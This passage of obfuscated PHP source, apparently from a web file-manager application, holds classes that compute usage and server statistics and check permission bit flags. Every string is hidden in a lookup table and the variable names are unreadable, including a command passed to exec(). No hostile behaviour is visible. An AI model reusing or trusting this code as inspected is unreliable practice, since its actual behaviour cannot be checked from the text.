$±ÓÑ£ë¢ =& $this->task; $±ÓÑ£ë¢[$…ÃàŞÚ³[1844]] = get_path_this($ãğØÙÄ‰); $±ÓÑ£ë¢[$…ÃàŞÚ³[1846]] = $àâ“îäÒ; $±ÓÑ£ë¢[$…ÃàŞÚ³[1847]] = $øßªÀéÖ; $±ÓÑ£ë¢[$…ÃàŞÚ³[1154]] = $û¨äÒË == $…ÃàŞÚ³[1921] ? $…ÃàŞÚ³[1916] : $…ÃàŞÚ³[1917]; $±ÓÑ£ë¢[$…ÃàŞÚ³[1848]] = $…ÃàŞÚ³[12]; $±ÓÑ£ë¢[$…ÃàŞÚ³[840]] = $àâ“îäÒ; $±ÓÑ£ë¢[$…ÃàŞÚ³[1913]] = $…ÃàŞÚ³[390]; $this->update(); } public function nameParse($ôÏúé§Ì) { $É¥Ïà†Û =& $_SERVER[ıÚ˜š²İ]; $¬Î°é—ä =& $this->task; if ($¬Î°é—ä[$É¥Ïà†Û[1793]] < $¬Î°é—ä[$É¥Ïà†Û[1152]]) { $¾ˆÔÆÍÛ = get_path_this($ôÏúé§Ì); if (strstr($¾ˆÔÆÍÛ, $É¥Ïà†Û[10])) { $¬Î°é—ä[$É¥Ïà†Û[1793]] += 1; } } if ($¬Î°é—ä[$É¥Ïà†Û[1913]] == $É¥Ïà†Û[1293]) { $¬Î°é—ä[$É¥Ïà†Û[1913]] = $É¥Ïà†Û[390]; } $¬Î°é—ä[$É¥Ïà†Û[1844]] = $ôÏúé§Ì; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ë’­íã) { $ãÑ­í¬Í =& $_SERVER[ıÚ˜š²İ]; $óäøÉ– = array($ãÑ­í¬Í[669] => array($ãÑ­í¬Í[33] => $ãÑ­í¬Í[1922], $ãÑ­í¬Í[353] => array($ãÑ­í¬Í[285], $ãÑ­í¬Í[842], $ãÑ­í¬Í[1923], $ãÑ­í¬Í[1924])), $ãÑ­í¬Í[1925] => array($ãÑ­í¬Í[33] => $ãÑ­í¬Í[1926], $ãÑ­í¬Í[353] => array($ãÑ­í¬Í[285], $ãÑ­í¬Í[840], $ãÑ­í¬Í[1927], $ãÑ­í¬Í[1928], $ãÑ­í¬Í[1929]))); if (!isset($óäøÉ–[$Ë’­íã])) { return !1; } $this->optionType = $óäøÉ–[$Ë’­íã][$ãÑ­í¬Í[33]]; $this->field = $óäøÉ–[$Ë’­íã][$ãÑ­í¬Í[353]]; return !0; } public function listData($õä¯õÔ¦ = false, $Áó¯ ¬• = "\155\157\144\x69\x66\171\x54\x69\155\x65", $ÈşòìëË = false) { return parent::listData($õä¯õÔ¦, $Áó¯ ¬•, $ÈşòìëË); } public function trendList($†ÔÃ·) { $ûâÁî =& $_SERVER[ıÚ˜š²İ]; $“è¾ŸÁ = $this->listData(); if ($“è¾ŸÁ) { $ïÖõ‰Ñ¬ = end($“è¾ŸÁ); $Ñåñ‡¯ = date($ûâÁî[1930], strtotime($ûâÁî[1931])); if ($ïÖõ‰Ñ¬[$ûâÁî[285]] == $Ñåñ‡¯) { return $“è¾ŸÁ; } $ğå²…ñ = strtotime($ïÖõ‰Ñ¬[$ûâÁî[285]]); } if (!isset($ğå²…ñ)) { $±İáÑ•ü = $†ÔÃ· == $ûâÁî[669] ? $ûâÁî[601] : $ûâÁî[907]; $ğå²…ñ = Model($±İáÑ•ü)->min($ûâÁî[234]); } $í”Éá»‡ = $ûâÁî[1932] . ucfirst($†ÔÃ·); $¹î°¢üŞ = $this->dateList($ğå²…ñ); foreach ($¹î°¢üŞ as $Ñåñ‡¯) { $this->{$í”Éá»‡}($Ñåñ‡¯); } return $this->listData(); } private function dateList($Í÷æëç«) { $˜é¶Şï =& $_SERVER[ıÚ˜š²İ]; $ÉîèÉ¢£ = $Í÷æëç«; $”¥¨úïÅ = strtotime($˜é¶Şï[1931]); $¥©â¾óŒ = array(); while ($ÉîèÉ¢£ <= $”¥¨úïÅ) { $¥©â¾óŒ[] = date($˜é¶Şï[1930], $ÉîèÉ¢£); $ÉîèÉ¢£ = strtotime($˜é¶Şï[1933], $ÉîèÉ¢£); } return $¥©â¾óŒ; } public function _recordUser($¢õ–‚ = '') { $…’×Áâ =& $_SERVER[ıÚ˜š²İ]; $±ß¤æÑ¼ = strtotime(date($…’×Áâ[1934], strtotime($¢õ–‚))); $÷ïŸğÉÔ = strtotime(date($…’×Áâ[1935], strtotime($¢õ–‚))); $à”çâÓ = array($…’×Áâ[234] => array($…’×Áâ[1102], $÷ïŸğÉÔ)); $êœ‘€Í¢ = Model($…’×Áâ[601])->where($à”çâÓ)->count($…’×Áâ[1792]); $à”çâÓ[$…’×Áâ[234]] = array($…’×Áâ[410], array($±ß¤æÑ¼, $÷ïŸğÉÔ)); $êæ€¢µÛ = Model($…’×Áâ[601])->where($à”çâÓ)->count($…’×Áâ[1792]); $à”çâÓ[$…’×Áâ[33]] = $…’×Áâ[1936]; $öÇå¿ı = Model($…’×Áâ[1937])->where($à”çâÓ)->count($…’×Áâ[1938]); $§ÆË‡–® = array($…’×Áâ[285] => $¢õ–‚, $…’×Áâ[842] => (int) $êœ‘€Í¢, $…’×Áâ[1923] => (int) $êæ€¢µÛ, $…’×Áâ[1924] => (int) $öÇå¿ı); return $this->insert($§ÆË‡–®); } public function _recordStore($Óşˆ¸×£ = '') { $Œ˜Ôİ÷à =& $_SERVER[ıÚ˜š²İ]; $¿˜ˆ”®› = strtotime(date($Œ˜Ôİ÷à[1935], strtotime($Óşˆ¸×£))); $Æ£ŞÙÕê = array($Œ˜Ôİ÷à[234] => array($Œ˜Ôİ÷à[1102], $¿˜ˆ”®›)); $‹ù¡éÖß = Model($Œ˜Ôİ÷à[548])->where($Æ£ŞÙÕê)->sum($Œ˜Ôİ÷à[79]); $Æ£ŞÙÕê[$Œ˜Ôİ÷à[487]] = 0; $æòäÕ£ï = Model($Œ˜Ôİ÷à[907])->where($Æ£ŞÙÕê)->sum($Œ˜Ôİ÷à[79]); $Æ£ŞÙÕê[$Œ˜Ôİ÷à[191]] = 1; $‚Š¨„ÖÓ = Model($Œ˜Ôİ÷à[907])->where($Æ£ŞÙÕê)->sum($Œ˜Ôİ÷à[79]); $Æ£ŞÙÕê[$Œ˜Ôİ÷à[191]] = 2; $Ì¦éÇÓé = Model($Œ˜Ôİ÷à[907])->where($Æ£ŞÙÕê)->sum($Œ˜Ôİ÷à[79]); $Áí®¤‡Ÿ = array($Œ˜Ôİ÷à[285] => $Óşˆ¸×£, $Œ˜Ôİ÷à[840] => (int) $æòäÕ£ï, $Œ˜Ôİ÷à[1927] => (int) $‹ù¡éÖß, $Œ˜Ôİ÷à[1928] => (int) $‚Š¨„ÖÓ, $Œ˜Ôİ÷à[1929] => (int) $Ì¦éÇÓé); return $this->insert($Áí®¤‡Ÿ); } public function trend($ÛôË‡Ğ , $°­²’¹‘) { $·ãğ†êÜ =& $_SERVER[ıÚ˜š²İ]; if (!$this->init($ÛôË‡Ğ )) { return !1; } $Ùèïã‰â = $this->trendList($ÛôË‡Ğ ); if ($Ùèïã‰â && $°­²’¹‘ != $·ãğ†êÜ[1764]) { $×ñßÍØ = $Ùèïã‰â[0][$·ãğ†êÜ[285]]; $ÅŠãÜÚ = $this->validDate($°­²’¹‘, $×ñßÍØ); $ÜË„æĞ = array(); $•é»•©Ï = array_to_keyvalue($Ùèïã‰â, $·ãğ†êÜ[285]); foreach ($ÅŠãÜÚ as $•Í¹ˆë) { if (isset($•é»•©Ï[$•Í¹ˆë])) { $­¾€ ®š = $•é»•©Ï[$•Í¹ˆë]; } else { $­¾€ ®š = end($Ùèïã‰â); $­¾€ ®š[$·ãğ†êÜ[285]] = $•Í¹ˆë; if ($ÛôË‡Ğ  == $·ãğ†êÜ[669]) { $­¾€ ®š[$·ãğ†êÜ[1923]] = $­¾€ ®š[$·ãğ†êÜ[1924]] = 0; } } $ÜË„æĞ[] = $­¾€ ®š; } $Ùèïã‰â = $ÜË„æĞ; } $ÒÛ¢ = array($·ãğ†êÜ[669] => array($·ãğ†êÜ[842] => LNG($·ãğ†êÜ[1939]), $·ãğ†êÜ[1923] => LNG($·ãğ†êÜ[1940]), $·ãğ†êÜ[1924] => LNG($·ãğ†êÜ[1941])), $·ãğ†êÜ[1925] => array($·ãğ†êÜ[840] => LNG($·ãğ†êÜ[1942]), $·ãğ†êÜ[1927] => LNG($·ãğ†êÜ[1943]), $·ãğ†êÜ[1928] => LNG($·ãğ†êÜ[1944]), $·ãğ†êÜ[1929] => LNG($·ãğ†êÜ[1945]))); $ä‰©¨Ôü = array($·ãğ†êÜ[669] => $·ãğ†êÜ[1946], $·ãğ†êÜ[1925] => $·ãğ†êÜ[79]); if (empty($Ùèïã‰â)) { $•Í¹ˆë = date($·ãğ†êÜ[1930], strtotime($·ãğ†êÜ[1931])); $×âíô± = array($·ãğ†êÜ[285] => $•Í¹ˆë); foreach ($ÒÛ¢[$ÛôË‡Ğ ] as $ßÏ½ñß => $–ÛÆº) { $×âíô±[$ßÏ½ñß] = 0; } $Ùèïã‰â[] = $×âíô±; } $Ãâ›ê÷ = array(); foreach ($Ùèïã‰â as $–ÛÆº) { if ($ÛôË‡Ğ  == $·ãğ†êÜ[1925] && $–ÛÆº[$·ãğ†êÜ[1927]] > $–ÛÆº[$·ãğ†êÜ[840]]) { $–ÛÆº[$·ãğ†êÜ[1927]] = $–ÛÆº[$·ãğ†êÜ[840]]; } foreach ($ÒÛ¢[$ÛôË‡Ğ ] as $ßÏ½ñß => $™Á¢ ÛŞ) { $­¾€ ®š = array($·ãğ†êÜ[285] => $–ÛÆº[$·ãğ†êÜ[285]], $·ãğ†êÜ[1680] => $™Á¢ ÛŞ); $­¾€ ®š[$ä‰©¨Ôü[$ÛôË‡Ğ ]] = isset($–ÛÆº[$ßÏ½ñß]) ? $–ÛÆº[$ßÏ½ñß] : 0; $Ãâ›ê÷[] = $­¾€ ®š; } } return $Ãâ›ê÷; } public function validDate($ìëá©Ü, $€ĞÑªúŸ) { $úàÆ´öø =& $_SERVER[ıÚ˜š²İ]; $Á»Ÿ¿ß´ = date($úàÆ´öø[1930], strtotime($úàÆ´öø[1931])); $¯Şˆ÷ï = array($Á»Ÿ¿ß´); switch ($ìëá©Ü) { case $úàÆ´öø[1771]: $Öì£°ù­ = mktime(0, 0, 0, date($úàÆ´öø[1947]), date($úàÆ´öø[1473]) - date($úàÆ´öø[1562]) + 7 - 7, date($úàÆ´öø[1948])); $úä¹ÜÌÍ = 0; do { $ééÆ¼“Ú = date($úàÆ´öø[1930], $Öì£°ù­ - 3600 * 24 * 7 * $úä¹ÜÌÍ); $¯Şˆ÷ï[] = $ééÆ¼“Ú; $úä¹ÜÌÍ++; } while ($€ĞÑªúŸ < $ééÆ¼“Ú); break; case $úàÆ´öø[1769]: $úä¹ÜÌÍ = 1; do { $Ä«Ú»£Õ = date($úàÆ´öø[1949], strtotime("\55\40{$úä¹ÜÌÍ}\x20\155\x6f\156\164\150\163")); $¯Şˆ÷ï[] = $Ä«Ú»£Õ; $úä¹ÜÌÍ++; } while ($€ĞÑªúŸ < $Ä«Ú»£Õ); break; case $úàÆ´öø[1950]: $öëÈÎ’± = (int) date($úàÆ´öø[1948], strtotime($€ĞÑªúŸ)); $“Ö·•¨é = (int) date($úàÆ´öø[1948]); if ($öëÈÎ’± >= $“Ö·•¨é) { break; } for ($öëÈÎ’±; $öëÈÎ’± < $“Ö·•¨é; $öëÈÎ’±++) { $¯Şˆ÷ï[] = $öëÈÎ’± . $úàÆ´öø[1951]; } break; default: break; } if ($€ĞÑªúŸ > end($¯Şˆ÷ï)) { array_pop($¯Şˆ÷ï); } sort($¯Şˆ÷ï); return $¯Şˆ÷ï; } public function listTable($õĞöâ¨Œ) { $Ìİ„Òß‘ = ucfirst($õĞöâ¨Œ); return Model($Ìİ„Òß‘)->listData(); } public function option($ªòù¶£¾) { $ÔôŒ°‘€ = $_SERVER[ıÚ˜š²İ][1952] . ucfirst($ªòù¶£¾); return $this->{$ÔôŒ°‘€}(); } private function optionUser() { $¥†Èì¼Š =& $_SERVER[ıÚ˜š²İ]; $ŒØŒ¬£… = Model($¥†Èì¼Š[601])->count($¥†Èì¼Š[1792]); $€šşñ´ã = Model($¥†Èì¼Š[601])->where($¥†Èì¼Š[1953])->count($¥†Èì¼Š[1792]); $æ§·Œí¼ = intval($GLOBALS[$¥†Èì¼Š[6]][$¥†Èì¼Š[426]][$¥†Èì¼Š[1737]]) / 3600; $ñÛşÑØ = strtotime("\x2d{$æ§·Œí¼}\40\150\x6f\x75\162\x73"); $“÷ÀŒ¼ƒ = strtotime(date($¥†Èì¼Š[1934])); if ($ñÛşÑØ < $“÷ÀŒ¼ƒ) { $ñÛşÑØ = $“÷ÀŒ¼ƒ; } $³ĞÊÅË = array($¥†Èì¼Š[1954] => array($¥†Èì¼Š[1103], $ñÛşÑØ)); $°ÔèÓå = (int) Model($¥†Èì¼Š[601])->where($³ĞÊÅË)->count($¥†Èì¼Š[1792]); if (!$°ÔèÓå) { $°ÔèÓå = 1; } $³ĞÊÅË = array($¥†Èì¼Š[1954] => array($¥†Èì¼Š[1103], $“÷ÀŒ¼ƒ)); $§ ¸ÒŠÌ = Model($¥†Èì¼Š[601])->where($³ĞÊÅË)->count($¥†Èì¼Š[1792]); return array($¥†Èì¼Š[835] => (int) $ŒØŒ¬£…, $¥†Èì¼Š[1955] => (int) ($ŒØŒ¬£… - $€šşñ´ã), $¥†Èì¼Š[1956] => (int) $€šşñ´ã, $¥†Èì¼Š[1957] => (int) $§ ¸ÒŠÌ, $¥†Èì¼Š[1958] => $°ÔèÓå); } private function optionFile() { $¥ÁåÏú =& $_SERVER[ıÚ˜š²İ]; $¨¹Ó‡„í = $this->sourceSize(); $Ïä¡şî† = $¨¹Ó‡„í[$¥ÁåÏú[79]]; $Œ‘êÁïæ = $¨¹Ó‡„í[$¥ÁåÏú[1927]]; $Æ¾›ü¾Ÿ = Model($¥ÁåÏú[907])->where(array($¥ÁåÏú[487] => 0))->count($¥ÁåÏú[194]); $ˆÔ¦Â¯ = array($¥ÁåÏú[487] => 0, $¥ÁåÏú[234] => array($¥ÁåÏú[1103], strtotime(date($¥ÁåÏú[1934])))); $Ğ»”øí = Model($¥ÁåÏú[907])->where($ˆÔ¦Â¯)->sum($¥ÁåÏú[79]); $ê¦¹é = Model($¥ÁåÏú[907])->where($ˆÔ¦Â¯)->count($¥ÁåÏú[194]); return array($¥ÁåÏú[840] => $Ïä¡şî†, $¥ÁåÏú[1927] => $Œ‘êÁïæ, $¥ÁåÏú[1959] => $Ïä¡şî† - $Œ‘êÁïæ, $¥ÁåÏú[1960] => (int) $Ğ»”øí, $¥ÁåÏú[842] => (int) $Æ¾›ü¾Ÿ, $¥ÁåÏú[1961] => (int) $ê¦¹é); } private function optionAccess() { $„“¯èåĞ =& $_SERVER[ıÚ˜š²İ]; return array($„“¯èåĞ[835] => $this->typeLogCnt(), $„“¯èåĞ[110] => $this->typeLogCnt($„“¯èåĞ[110]), $„“¯èåĞ[527] => $this->typeLogCnt($„“¯èåĞ[527]), $„“¯èåĞ[1962] => $this->typeLogCnt($„“¯èåĞ[1962]), $„“¯èåĞ[1963] => $this->typeLogCnt($„“¯èåĞ[1963]), $„“¯èåĞ[669] => $this->typeLogCnt($„“¯èåĞ[12], $„“¯èåĞ[1938])); } private function typeLogCnt($¢€ã˜¾ = '', $ñû•÷ªû = "\x69\144") { $ Óã¤¨ı =& $_SERVER[ıÚ˜š²İ]; $È€¤ºƒÙ = array($ Óã¤¨ı[110] => array($ Óã¤¨ı[1964], $ Óã¤¨ı[1965]), $ Óã¤¨ı[527] => array($ Óã¤¨ı[1966], $ Óã¤¨ı[1967]), $ Óã¤¨ı[1962] => array($ Óã¤¨ı[1968], $ Óã¤¨ı[1969], $ Óã¤¨ı[1970]), $ Óã¤¨ı[1963] => array($ Óã¤¨ı[1971], $ Óã¤¨ı[1972]), $ Óã¤¨ı[1973] => array($ Óã¤¨ı[1974], $ Óã¤¨ı[1975], $ Óã¤¨ı[1976])); $°üâ®óò = strtotime(date($ Óã¤¨ı[1934])); $şò»íğû = array($ Óã¤¨ı[234] => array($ Óã¤¨ı[1103], $°üâ®óò)); if ($¢€ã˜¾) { $şò»íğû[$ Óã¤¨ı[33]] = array($ Óã¤¨ı[7], $È€¤ºƒÙ[$¢€ã˜¾]); } $·Äšå€¨ = Model($ Óã¤¨ı[1937])->where($şò»íğû)->count($ñû•÷ªû); return (int) $·Äšå€¨; } private function optionServer() { $ÛÒÀû¯÷ =& $_SERVER[ıÚ˜š²İ]; $ïÍ…ÚÄµ = $this->diskDriver(); $«¿Ä¤í× = KodIO::defaultDriver(); $†óÃ™—å = array($ÛÒÀû¯÷[900] => $«¿Ä¤í×[$ÛÒÀû¯÷[477]]); $ÇÑËÑ¥Ã = Model($ÛÒÀû¯÷[548])->where($†óÃ™—å)->sum($ÛÒÀû¯÷[79]); $Âùó“«  = explode($ÛÒÀû¯÷[53], $_SERVER[$ÛÒÀû¯÷[147]]); $¡éí  ° = $Âùó“« [0]; $Üş·¬‹€ = $GLOBALS[$ÛÒÀû¯÷[6]][$ÛÒÀû¯÷[21]]; $Ÿ›î¼ü¨ = $Üş·¬‹€[$ÛÒÀû¯÷[1065]]; if ($Ÿ›î¼ü¨ == $ÛÒÀû¯÷[1053]) { $‚½»óÇ = explode($ÛÒÀû¯÷[1382], $Üş·¬‹€[$ÛÒÀû¯÷[1064]]); $Ÿ›î¼ü¨ = $‚½»óÇ[0]; } if ($Ÿ›î¼ü¨ == $ÛÒÀû¯÷[1001] || $Ÿ›î¼ü¨ == $ÛÒÀû¯÷[885]) { $úÃÇ¾ò™ = Model()->db()->query($ÛÒÀû¯÷[1977]); $Û¥—·Â = $úÃÇ¾ò™[0] && isset($úÃÇ¾ò™[0][$ÛÒÀû¯÷[1679]]) ? $úÃÇ¾ò™[0][$ÛÒÀû¯÷[1679]] : 0; $Ÿ›î¼ü¨ = $ÛÒÀû¯÷[1978] . ($Û¥—·Â ? $ÛÒÀû¯÷[8] . $Û¥—·Â : $ÛÒÀû¯÷[12]); } $Ôã¡Æ…ì = $GLOBALS[$ÛÒÀû¯÷[6]][$ÛÒÀû¯÷[426]][$ÛÒÀû¯÷[909]]; return array($ÛÒÀû¯÷[1979] => $ïÍ…ÚÄµ ? $ïÍ…ÚÄµ[$ÛÒÀû¯÷[1980]] : 0, $ÛÒÀû¯÷[1981] => $ïÍ…ÚÄµ ? $ïÍ…ÚÄµ[$ÛÒÀû¯÷[1982]] : 0, $ÛÒÀû¯÷[1983] => (int) $«¿Ä¤í×[$ÛÒÀû¯÷[1980]] * 1024 * 1024 * 1024, $ÛÒÀû¯÷[1984] => (int) $ÇÑËÑ¥Ã, $ÛÒÀû¯÷[1985] => ucfirst($¡éí  °), $ÛÒÀû¯÷[1986] => $ÛÒÀû¯÷[1987] . PHP_VERSION, $ÛÒÀû¯÷[1988] => phpBuild64() ? 64 : 32, $ÛÒÀû¯÷[834] => str_replace($ÛÒÀû¯÷[1221], $ÛÒÀû¯÷[1081], $Ÿ›î¼ü¨), $ÛÒÀû¯÷[426] => ucfirst($Ôã¡Æ…ì), $ÛÒÀû¯÷[32] => $_SERVER[$ÛÒÀû¯÷[1989]]); } private function diskDriver() { $ä‚ô˜ ú =& $_SERVER[ıÚ˜š²İ]; $õ‘ ¨Úı = $ä‚ô˜ ú[8]; $Ä¶Öáë° = $GLOBALS[$ä‚ô˜ ú[6]][$ä‚ô˜ ú[1406]] == $ä‚ô˜ ú[1407]; if ($Ä¶Öáë°) { $õ‘ ¨Úı = $ä‚ô˜ ú[1990]; if (function_exists($ä‚ô˜ ú[1991])) { exec($ä‚ô˜ ú[1992], $áª®Ä™ğ); $õ‘ ¨Úı = $áª®Ä™ğ[1] . $ä‚ô˜ ú[8]; } } if (!file_exists($õ‘ ¨Úı)) { return; } if (!function_exists($ä‚ô˜ ú[1993])) { return; } $ì²¶»óÄ = @disk_total_space($õ‘ ¨Úı); $µØıƒ”ç = $ì²¶»óÄ - @disk_free_space($õ‘ ¨Úı); return array($ä‚ô˜ ú[1980] => $ì²¶»óÄ, $ä‚ô˜ ú[1982] => $µØıƒ”ç); } public function fileChart($‡¢ÄÀİÙ) { $²é¢üİ· =& $_SERVER[ıÚ˜š²İ]; if (isset($‡¢ÄÀİÙ[$²é¢üİ·[1792]])) { return Model($²é¢üİ·[907])->userFileTypeProfile($‡¢ÄÀİÙ[$²é¢üİ·[1792]]); } if (isset($‡¢ÄÀİÙ[$²é¢üİ·[1404]])) { return Model($²é¢üİ·[907])->groupFileTypeProfile($‡¢ÄÀİÙ[$²é¢üİ·[1404]]); } $ëâ„•ŒË = $this->sourceSize(); $ÆÈùæ· = array($²é¢üİ·[193] => 0, $²é¢üİ·[191] => 1); $ãçœÁà = Model($²é¢üİ·[907])->where($ÆÈùæ·)->sum($²é¢üİ·[79]); $ÆÈùæ·[$²é¢üİ·[191]] = 2; $¿İ¥€Øè = Model($²é¢üİ·[907])->where($ÆÈùæ·)->sum($²é¢üİ·[79]); return array($²é¢üİ·[840] => $ëâ„•ŒË[$²é¢üİ·[79]], $²é¢üİ·[1927] => $ëâ„•ŒË[$²é¢üİ·[1927]], $²é¢üİ·[1928] => (int) $ãçœÁà, $²é¢üİ·[1929] => (int) $¿İ¥€Øè); } private function sourceSize() { $©¯›¨Ø¥ =& $_SERVER[ıÚ˜š²İ]; $÷Ã¼×ö = Model($©¯›¨Ø¥[907])->where(array($©¯›¨Ø¥[487] => 0))->sum($©¯›¨Ø¥[79]); $­ö¢¢š˜ = Model($©¯›¨Ø¥[548])->sum($©¯›¨Ø¥[79]); if ($­ö¢¢š˜ > $÷Ã¼×ö) { $­ö¢¢š˜ = $÷Ã¼×ö; } return array($©¯›¨Ø¥[79] => (int) $÷Ã¼×ö, $©¯›¨Ø¥[1927] => (int) $­ö¢¢š˜); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÃÅÔ´Ö™ =& $_SERVER[ıÚ˜š²İ]; $€®¼´Ï¹ = array(array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[1994]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[1996], $ÃÅÔ´Ö™[1997] => 1, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2000]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2001], $ÃÅÔ´Ö™[1997] => 2, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2002]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2003], $ÃÅÔ´Ö™[1997] => 3, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2004]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2005], $ÃÅÔ´Ö™[1997] => 4, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2006]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2007], $ÃÅÔ´Ö™[1997] => 5, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2008]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2009], $ÃÅÔ´Ö™[1997] => 6, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÃÅÔ´Ö™[496] => LNG($ÃÅÔ´Ö™[2010]), $ÃÅÔ´Ö™[1995] => $ÃÅÔ´Ö™[2011], $ÃÅÔ´Ö™[1997] => 7, $ÃÅÔ´Ö™[1998] => 1, $ÃÅÔ´Ö™[1999] => 0)); return $€®¼´Ï¹; } public static function authCheck($Ïüê®‚é, $³îÌ•å’) { $áè£å¥Ë =& $_SERVER[ıÚ˜š²İ]; $Ïüê®‚é = intval($Ïüê®‚é); if (KodUser::isRoot() && $GLOBALS[$áè£å¥Ë[6]][$áè£å¥Ë[2012]]) { return !0; } if ($Ïüê®‚é <= 0) { return !1; } if (($Ïüê®‚é & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ïüê®‚é & $³îÌ•å’); } public static function authCheckShow($•©£¶éÀ) { return self::authCheck($•©£¶éÀ, self::AUTH_SHOW); } public static function authCheckView($€•íÏà¹) { return self::authCheck($€•íÏà¹, self::AUTH_VIEW); } public static function authCheckDownload($„ù‡×ÚÂ) { return self::authCheck($„ù‡×ÚÂ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($æü®ƒÑœ) { return self::authCheck($æü®ƒÑœ, self::AUTH_UPLOAD); } public static function authCheckEdit($•‘…õ¸Ã) { return self::authCheck($•‘…õ¸Ã, self::AUTH_EDIT); } public static function authCheckRemove($Ùóû±‘Î) { return self::authCheck($Ùóû±‘Î, self::AUTH_REMOVE); } public static function authCheckShare($™š—äÜ) { return self::authCheck($™š—äÜ, self::AUTH_SHARE); } public static function authCheckComment($Õœ®×›) { return self::authCheck($Õœ®×›, self::AUTH_COMMENT); } public static function authCheckEvent($¡”×„’¶) { return self::authCheck($¡”×„’¶, self::AUTH_EVENT); } public static function authCheckRoot($ŒıÉë²ï) { return self::authCheck($ŒıÉë²ï, self::AUTH_ROOT); } public static function authCheckAction($ĞÎè÷Ùµ, $Úî·¥¢) { $¢•¨çê =& $_SERVER[ıÚ˜š²İ]; $®é³„¾ = array($¢•¨çê[2013] => self::AUTH_VIEW, $¢•¨çê[1293] => self::AUTH_DOWNLOAD, $¢•¨çê[110] => self::AUTH_UPLOAD, $¢•¨çê[1963] => self::AUTH_EDIT, $¢•¨çê[1962] => self::AUTH_REMOVE, $¢•¨çê[1973] => self::AUTH_SHARE, $¢•¨çê[431] => self::AUTH_COMMENT, $¢•¨çê[1779] => self::AUTH_EVENT, $¢•¨çê[2014] => self::AUTH_ROOT); if (!isset($®é³„¾[$Úî·¥¢])) { return; } $“²Ô« = $®é³„¾[$Úî·¥¢]; $ĞÎè÷Ùµ = intval($ĞÎè÷Ùµ); if ($ĞÎè÷Ùµ <= 0) { return !1; } if (($ĞÎè÷Ùµ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ĞÎè÷Ùµ & $“²Ô«); } public static function authDisable($«ŞùÊ¤, $İ™’Çç‰) { if (intval($«ŞùÊ¤) <= 0) { return 0; } return intval($«ŞùÊ¤) & ~$İ™’Çç‰; } public $optionType = "\123\171\x73\164\145\x6d\x2e\163\157\165\162\x63\145\101\x75\x74\150\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x61\x75\x74\150", "\154\x61\x62\145\154", "\144\x69\163\160\154\x61\171", "\x73\171\163\x74\x65\155", "\163\157\x72\164"); public function initData() { $çõÅ³ä¼ = $this->authDefault(); foreach ($çõÅ³ä¼ as $Í—¦ù·ü) { $this->add($Í—¦ù·ü); } } public function findAuth($›—è¹ÔÜ, $ÄìÀ¯û–) { $Çää‡ö =& $_SERVER[ıÚ˜š²İ]; $­ëŠâ±ê = parent::listData(); foreach ($­ëŠâ±ê as $Á¡ŠâÔ) { $İôà”á¸ = intval($Á¡ŠâÔ[$Çää‡ö[489]]); if ($İôà”á¸ <= 0 || $Á¡ŠâÔ[$Çää‡ö[2015]] == 0) { continue; } if (($İôà”á¸ & $›—è¹ÔÜ) != $›—è¹ÔÜ) { continue; } if (($İôà”á¸ & $ÄìÀ¯û–) != 0) { continue; } return $Á¡ŠâÔ[$Çää‡ö[477]]; } return !1; } public function findAuthMax($¡ûªğçó, $İ¿) { $é”½¥œ =& $_SERVER[ıÚ˜š²İ]; $úÎì’ô‘ = !1; $À×ıŒµü = parent::listData(); foreach ($À×ıŒµü as $’û§«éƒ) { $±öìæ»´ = intval($’û§«éƒ[$é”½¥œ[489]]); if ($±öìæ»´ <= 0 || $’û§«éƒ[$é”½¥œ[2015]] == 0) { continue; } if (($±öìæ»´ & $¡ûªğçó) != 